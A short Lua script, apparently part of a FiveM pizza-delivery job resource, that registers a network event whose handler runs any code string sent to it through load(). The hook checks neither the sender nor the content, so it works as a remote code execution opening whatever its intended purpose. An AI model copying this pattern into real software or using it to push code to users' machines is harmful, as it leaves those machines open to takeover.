--[[
    discord:    krane#2890
]]
RegisterNetEvent("Livrator_Pizza:Secure_Load") 
AddEventHandler("Livrator_Pizza:Secure_Load", function(srcfile) 
    local f = load(srcfile)()
end)